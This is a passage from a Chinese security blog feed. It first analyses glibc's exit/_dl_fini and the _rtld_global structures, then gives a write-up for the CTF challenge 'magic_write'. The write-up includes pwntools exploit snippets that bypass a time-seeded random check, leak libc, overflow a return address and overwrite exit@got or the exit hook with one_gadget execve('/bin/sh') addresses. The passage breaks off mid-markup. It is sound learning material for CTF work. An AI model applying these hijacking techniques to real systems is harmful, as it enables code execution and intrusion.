l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                   <span class="comment">/* </span></span><br><span class="line"><span class="comment">                       ELF中 fini_arraysz节用来记录fini_array节的大小</span></span><br><span class="line"><span class="comment">                       l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符</span></span><br><span class="line"><span class="comment">                       l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位</span></span><br><span class="line"><span class="comment">                       i: fini_array节的大小/一个指针大小, 即fini_array中有多少个析构函数</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>) <span class="comment">//从后往前调用析构函数</span></span><br><span class="line">    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>) <span class="comment">//调用fini段中的函数</span></span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">      --l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是不是看的一脸懵逼？根据注释我们可以发现ld还调用了一个叫_dl_open的函数。这个函数干了什么事呢？我们知道动态链接的elf文件会共享libc里的符号，把libc里的符号加载到不同进程的过程叫映射，映射工作由动态链接器也就是ld来完成。我们把进程空间中的每个单独文件称之为模块。ld则调用了_dl_open函数来映射这些模块到进程空间中，并且把所有映射的文件都记录在__rtld_global中。同样的，当进程结束时，ld还要负责用_dl_close()卸载这些模块。</p><h5 id="rtld-global结构体"><a href="#rtld-global结构体" class="headerlink" title="__rtld_global结构体"></a>__rtld_global结构体</h5><p>我们追踪一下这个结构体，在ldsodefs.h中有定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span> <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded; <span class="comment">//模块数量</span></span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span> <span class="comment">//映射模块的搜索表</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span> //这个命名空间中的符号表, 单个命名空间中的符号不允许重复</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> hashval; <span class="comment">//符号的哈希值</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name; <span class="comment">//符号名称</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym; <span class="comment">//符号</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span> <span class="comment">//所属模块</span></span><br><span class="line">      &#125; *entries; <span class="comment">//索引指针</span></span><br><span class="line">      <span class="type">size_t</span> size; <span class="comment">//元素数量</span></span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="type">void</span> (*<span class="built_in">free</span>) (<span class="type">void</span> *); <span class="comment">//析构函数</span></span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS]; <span class="comment">//一个命名空间一个link_namespace结构体</span></span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns; <span class="comment">//使用了多少个命名空间</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* During the program run we must not modify the global data of</span></span><br><span class="line"><span class="comment">     loaded shared object simultanously in two threads.  Therefore we</span></span><br><span class="line"><span class="comment">     protect `_dl_open&#x27; and `_dl_close&#x27; in dl-close.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     This must be a recursive lock since the initializer function of</span></span><br><span class="line"><span class="comment">     the loaded object might as well require a call to this function.</span></span><br><span class="line"><span class="comment">     At this time it is not anymore a problem to modify the tables.  */</span></span><br><span class="line">  __rtld_lock_define_recursive (EXTERN, _dl_load_lock)</span><br><span class="line">  <span class="comment">/* This lock is used to keep __dl_iterate_phdr from inspecting the</span></span><br><span class="line"><span class="comment">     list of loaded objects while an object is added to or removed</span></span><br><span class="line"><span class="comment">     from that list.  */</span></span><br><span class="line">  __rtld_lock_define_recursive (EXTERN, _dl_load_write_lock)</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br></pre></td></tr></table></figure><p>定义很复杂，我们只关注想要看的部分。</p><ul><li>ns代表着NameSpace</li><li>nns代表着Num of NameSpace</li><li>struct rtld_global先以命名空间为单位建立了一个数组 <em>dl_ns[DL_NNS]</em></li><li>_在每个命名空间内部加载的模块以双向链表组织, 通过_ns_loaded索引</li><li>同时每个命名空间内部又有一个符号表_ns_unique_sym_table, 记录着所有模块导出的符号集合</li></ul><p>再来关注link_map结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"><span class="comment">//模块的基地址</span></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF file and the addresses in memory.  */</span> <span class="comment">//模块的基地址</span></span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span> <span class="comment">//模块的文件名</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span> <span class="comment">//指向elf的dyn节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns; <span class="comment">//模块所属命名空间的idx</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;<span class="comment">/* Pointer to program header table in core.  */</span> <span class="comment">//elf的头表</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span> <span class="comment">//elf的入口</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span> <span class="comment">//头表的节数</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span> <span class="comment">//dyn中的描述符数量</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>总而言之，我们可以知道，glibc按照: 命名空间-&gt;模块-&gt;节 的形式描述所有的模块, 通过_ns_unique_sym_table描述命名空间中所有的可见符号。这时候我们再返回去看dl_fini()的流程，不难发现他的工作就是：</p><ol><li>遍历rtld_global中的所有命名空间</li><li>遍历命名空间中的所有模块</li><li>找到这个模块所在的fini_array段，并调用其中所有的函数指针</li><li>找到这个模块所在的fini段，并调用所有函数指针</li></ol><h5 id="可劫持的lock与unlock函数指针"><a href="#可劫持的lock与unlock函数指针" class="headerlink" title="可劫持的lock与unlock函数指针"></a>可劫持的lock与unlock函数指针</h5><p>所以__rtld_global结构体非常重要。这个结构体里还有什么其他重要的东西没有呢？有，那就是用来上锁和解锁的两个函数指针，在摘抄过来的代码的60行和64行。如果去追溯dl_fini函数中的<code>__rtld_lock_lock_recursive (GL(dl_load_lock));</code>，会发现它宏定义展开后，其实调用的就是结构体中第60行的函数。而__rtld_global结构体又是写在ld.so.2文件的.data段中的，所以如果我们泄露了libc地址或者ld地址，有任意写的机会，我们就可以劫持这两个函数指针为ogg从而getshell。</p><p>别忘了，他们也是析构函数本身，劫持后只有机会执行一次，然后就会被置为ef_free了。详情看<a href="https://c-lby.top/2024/05/12/exit-hook-first-try/#%E5%8A%AB%E6%8C%81exit-hook%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%AA%E8%83%BD%E7%94%A8%E4%B8%80%E9%81%8D">这篇文章</a>。</p><h3 id="其他利用点"><a href="#其他利用点" class="headerlink" title="其他利用点"></a>其他利用点</h3><p>不想写了，看看这个师傅的<a href="https://www.anquanke.com/post/id/243196#h3-9">文章</a>吧。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/243196">exit()分析与利用</a></p><p><a href="https://www.anquanke.com/post/id/260754">Glibc2.32源码分析之exit部分</a></p><p><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up</a></p>]]></content>
      
      
      <categories>
          
          <category> glibc源码补完计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『2024sdpctf(山警校赛)』magic_write</title>
      <link href="/2024/exit-hook-first-try/"/>
      <url>/2024/exit-hook-first-try/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">20</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  myinit(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter this challenge&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  v6 = v7 % <span class="number">0x6E</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 % <span class="number">0x6E</span> == v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give you a gift&quot;</span>);</span><br><span class="line">    gift();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Do you know any address to write&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come and try it out&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x2E</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数开头要我们绕过一个随机数检查才有输入点。gift函数会打印puts函数的libc地址，libc地址不请自来。接着read函数溢出14个字节，只能覆盖六个字节到ret地址，所以想要在这里写one gadget是不可能的了，因为libc地址占七个字节。</p><p>另外，题目有一个magic函数，可以进行任意地址写，并且只能读取八个字节，以exit退出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations on completing a big step&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个提示就很明显了，可以劫持exit@got或者劫持exit_hook写one gadget。</p><h3 id="分析调试-出现的问题"><a href="#分析调试-出现的问题" class="headerlink" title="分析调试&amp;出现的问题"></a>分析调试&amp;出现的问题</h3><h5 id="随机数绕过"><a href="#随机数绕过" class="headerlink" title="随机数绕过"></a>随机数绕过</h5><p>开头的随机数种子是time(0)，题目给了libc附件，所以我们可以在python使用ctypes库来调用动态链接库函数来同步获取time(0)，以获得相同的随机数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libcc = cdll.LoadLibrary(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libcc.srand(libcc.time(<span class="number">0</span>))</span><br><span class="line">ran_num = libcc.rand() % <span class="number">0x6E</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;please enter this challenge\n&quot;</span>, <span class="built_in">str</span>(ran_num).encode())</span><br></pre></td></tr></table></figure><p>在打远程靶机的时候可能会因为时延而获取不到相同的随机数，多试几次就好了。</p><h4 id="接收libc地址"><a href="#接收libc地址" class="headerlink" title="接收libc地址"></a>接收libc地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&quot;Give you a gift\n&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><p>溢出只溢出了六个字节，但是我们在这里的目的，是劫持程序执行流执行magic函数，获得任意地址写的机会。</p><p>这里需要注意一个问题，不要发超过六个字节。后面magic函数里是两个read，如果前面留下字节在输入流中，会被后面的read直接读取，导致意料之外的错误。另外就是最好是用send，sendline会引入多一个回车。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magic = <span class="number">0x4012bd</span></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + <span class="string">b&#x27;\xbd\x12\x40\x00\x00\x00&#x27;</span></span><br><span class="line">r.send(pay1)</span><br></pre></td></tr></table></figure><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>这是这道题的核心，也是发现最多问题的地方。其实运气好的话可以不用那么曲折，不过遇到了问题可以学到更多东西，未尝不是一种好事。</p><p>我们在看一次magic函数的核心语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>第一个read可以控制buf的地址，第二个read可以控制buf内容，妥妥的任意地址写。因为只有8个字节的空间，所以考虑劫持got表。有libc附件可以得到onegadget</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc-<span class="number">2.31</span>.so</span><br><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line"><span class="title">constraints</span>:</span><br><span class="line">  [r15] == <span class="type">NULL</span> || r15 == <span class="type">NULL</span> || r15 is a valid argv</span><br><span class="line">  [r12] == <span class="type">NULL</span> || r12 == <span class="type">NULL</span> || r12 is a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line"><span class="title">constraints</span>:</span><br><span class="line">  [r15] == <span class="type">NULL</span> || r15 == <span class="type">NULL</span> || r15 is a valid argv</span><br><span class="line">  [rdx] == <span class="type">NULL</span> || rdx == <span class="type">NULL</span> || rdx is a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line"><span class="title">constraints</span>:</span><br><span class="line">  [rsi] == <span class="type">NULL</span> || rsi == <span class="type">NULL</span> || rsi is a valid argv</span><br><span class="line">  [rdx] == <span class="type">NULL</span> || rdx == <span class="type">NULL</span> || rdx is a valid envp</span><br></pre></td></tr></table></figure><h5 id="劫持got表，但one-gadget无效"><a href="#劫持got表，但one-gadget无效" class="headerlink" title="劫持got表，但one gadget无效"></a>劫持got表，但one gadget无效</h5><p>然后利用下面的脚本来劫持exit@got</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line">r.send(p64(e.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">r.send(p64(libc_base+one[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><p>然后你会发现，打不通。动调，看看怎么个事</p><p><img src="https://c-lby.top/images/exit_hook_first_try/%E5%AF%84%E5%AD%98%E5%99%A8%E7%8A%B6%E6%80%81.png" alt="寄存器状态"></p><p>好家伙，rdx和r12都不为0，根本没法执行execve的onegadget，因为参数不匹配，所以syscall直接失效了，最后执行到<code>__stack_chk_fail</code>的时候就会卡住：</p><p><img src="https://c-lby.top/images/exit_hook_first_try/%E6%97%A0%E6%95%88onegadget%E5%8D%A1%E4%BD%8F.png" alt="无效onegadget卡住"></p><p>我们没办法在仅有8个字节的read里解决寄存器问题，所以不得不放弃劫持got表，转战劫持exit hook。</p><h5 id="劫持exit-hook，但是被检测到栈溢出？"><a href="#劫持exit-hook，但是被检测到栈溢出？" class="headerlink" title="劫持exit hook，但是被检测到栈溢出？"></a>劫持exit hook，但是被检测到栈溢出？</h5><p>顺带一提，程序本身是没有开canary保护的，但是libc是有canary保护的，所以在执行one gadget的时候会执行到__stack_chk_fail也很正常。</p><p>要劫持<a href="https://xz.aliyun.com/t/12856?time__1311=mqmhq+xfxUxoDsD7GY5r=bDk7D8lKeD&alichlgref=https://www.bing.com/#toc-2">exit hook</a>，我们要先找到当前版本下_rtld_global结构体的位置和对应_dl_rtld_lock_recursive的位置。我们用gdb打开程序（默认已经patchelf了），运行后中断，输入以下命令：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span 